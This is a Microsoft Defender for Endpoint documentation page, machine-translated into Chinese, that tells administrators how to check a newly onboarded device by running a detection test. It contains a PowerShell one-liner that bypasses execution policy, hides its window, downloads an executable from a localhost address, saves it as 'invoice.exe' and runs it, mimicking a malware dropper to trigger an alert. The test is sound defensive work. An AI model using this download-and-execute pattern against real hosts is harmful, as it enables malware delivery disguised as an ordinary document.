---
title: 在新载入的 Microsoft Defender 终结点设备上运行检测测试
description: 在新载入的设备上运行检测脚本，以验证它是否正确载入到 Microsoft Defender for Endpoint 服务。
keywords: 检测测试， 检测， powershell， 脚本， 验证， 载入， 适用于终结点载入的 microsoft defender， 客户端， 服务器， 测试
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: d73a07bdd57748a5756d0fabddeff3aee0cd4d5d
ms.sourcegitcommit: d817a3aecb700f7227a05cd165ffa7dbad67b09d
ms.translationtype: MT
ms.contentlocale: zh-CN
ms.lasthandoff: 07/29/2021
ms.locfileid: "53656279"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>在新载入的 Microsoft Defender 终结点设备上运行检测测试 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**适用于：**
- 支持Windows 10版本
- Windows Server 2012 R2
- Windows Server 2016
- Windows服务器版本 1803
- WindowsServer， 2019
- [Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> 希望体验 Microsoft Defender for Endpoint？ [注册免费试用版](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)。

在新载入的设备上运行以下 PowerShell 脚本，验证它是否正确报告给 Defender for Endpoint 服务。

1. 创建文件夹："C：\test-MDATP-test"。
2. 在设备上打开提升的命令行提示符并运行脚本：

   1. 转到“**开始**”并键入“**cmd**”。

   1. 右键单击命令 **提示符** ，然后选择 **以管理员角色运行**。

      ![指向"开始"菜单以管理员角色运行"的窗口](images/run-as-admin.png)

3. 在提示符下，复制并运行以下命令：

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

命令提示符窗口将自动关闭。 如果成功，检测测试将标记为已完成，并且大约 10 分钟后，已载入设备的门户中将显示新警报。

## <a name="related-topics"></a>相关主题
- [载入 Windows 10 设备](configure-endpoints.md)
- [载入服务器](configure-server-endpoints.md)
- [Microsoft Defender 终结点载入问题疑难解答](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
